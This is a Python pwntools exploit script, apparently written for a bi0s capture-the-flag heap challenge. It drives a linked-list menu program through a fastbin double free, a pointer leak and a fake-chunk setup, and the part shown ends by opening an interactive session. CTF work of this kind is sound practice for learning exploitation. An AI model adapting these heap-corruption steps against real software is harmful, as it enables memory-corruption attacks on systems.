#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("pwn.challenge.bi0s.in", 1234)

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def _check_result():
    res = io.recvline().strip()
    if res == b"Success":
        return True

    return False

def _view(view=False):
    while True:
        res = io.recvline(timeout=0.5)
        if not res:
            break
        if not view:
            continue
        print(res)

def add(data, size):
    log.info(f"Adding data: {data} of size: {size}")
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", data)
    return _check_result()

def remove(index, offset, view=False):
    log.info(f"Removing offset: {offset} from index: {index}")
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b": ", str(index).encode())
    _view(view=False)

    io.recvuntil(b") ")
    io.sendline(str(offset).encode())
    return _check_result()

def link(to_idx, from_idx):
    log.info(f"Linking index: {from_idx} to idx: {to_idx}")
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b": ", str(to_idx).encode())
    io.sendlineafter(b": ", str(from_idx).encode())
    return _check_result()

def unlink(index, offset, keep=b"y"):
    log.info(f"Unlinking index: {index} at offset: {offset}")
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b": ", str(index).encode())
    _view()
    io.recvuntil(b": ")
    io.sendline(str(offset).encode())
    io.recvuntil(b"? ")
    io.sendline(keep)
    return _check_result()

def exit():
    io.sendlineafter(b">> ", b"5")


io = start()

################################################################################
# DOUBLE FREE FASTBINS
################################################################################

size=0x60
add(b"A"*size, size) # 0
add(b"B"*size, size) # 1
add(b"C"*size, size) # 2
add(b"D"*size, size) # 3

link(2, 3) # 2 -> 3
link(1, 2) # 1 -> 2 -> 3
link(0, 1) # 0 -> 1 -> 2 -> 3

unlink(0, 3) # 0 -> 1 -> 3, 2 -> 3

remove(1, 1337) # free(2), free(3) -> in fastbins X <-> Y
add(b"F"*size, size)

for i in range(3):
    add(b"E"*0x18, 0x18)
add(b"E"*size, size)

for i in range(3):
    remove(2+i, 1)
remove(5, 1)

remove(0, 1)

for i in range(7):
    add(b"E"*(size-0x10)+p64(0x0)+p64(0x481), size)

for i in range(7):
    remove(2+i, 1)

remove(0, 2)
remove(0, 1)
remove(1, 1)

################################################################################
# LEAK
################################################################################

for i in range(3):
    add(b"A"*0x18, 0x18)

add(b"B"*size, size) # 3
add(b"", 0x18) # 4, data = &5
add(b"D"*size, size) # 5

remove(0, 1)
remove(5, 1)
link(4, 1)

io.sendlineafter(b">> ", b"2")
io.sendlineafter(b": ", b"4")
io.recvuntil(b"1 : ")
leak = io.recvline().strip()
leak = u64(leak.ljust(8, b"\x00"))
log.success(f"Got leak! {hex(leak)}")
io.recvuntil(b") ")
io.sendline(b"2")

remove(2, 1)
remove(3, 1)

################################################################################
# FAKE CHUNK
################################################################################

for i in range(3):
    add(b"A"*0x18, 0x18)

add(p64(0x00)+p64(0x471), 0x10)

io.interactive()

